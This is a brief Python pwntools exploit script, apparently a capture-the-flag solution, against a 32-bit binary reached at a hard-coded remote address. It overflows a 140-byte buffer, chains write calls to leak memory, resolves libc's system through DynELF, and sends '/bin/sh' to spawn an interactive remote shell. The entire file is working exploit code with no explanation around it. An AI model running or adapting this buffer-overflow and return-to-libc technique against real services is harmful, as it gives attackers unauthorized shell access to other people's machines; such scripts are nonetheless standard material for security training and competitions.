#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
trash = 'a'*140
#r = process('/tmp/p/a')
r = remote('209.222.100.138', 9880)
read = 0x8048310
write = 0x8048340
leave_ret = 0x080483b8
pop3_ret = 0x08048509
pop_ebp = 0x0804850b
read_got = 0x804a00c
write_got = 0x0804a018
main = 0x08048470
buf1 = 0x0804b000 - 0x200
def leak(addr):
	trash = 'a'*140
	pad = flat([write, main, 1, addr, 4])
	r.send(trash + pad)
	s = r.recv(4)
	print repr(s)
	return s

d = DynELF(leak, elf=ELF('/tmp/p/a'))
system_addr = d.lookup('system', 'libc')
print "system addr: ",hex(system_addr)
pad1 = trash + flat([read, pop3_ret, 0, buf1, 8, system_addr, main, buf1])
r.send(pad1)
r.send('/bin/sh\x00')
r.interactive()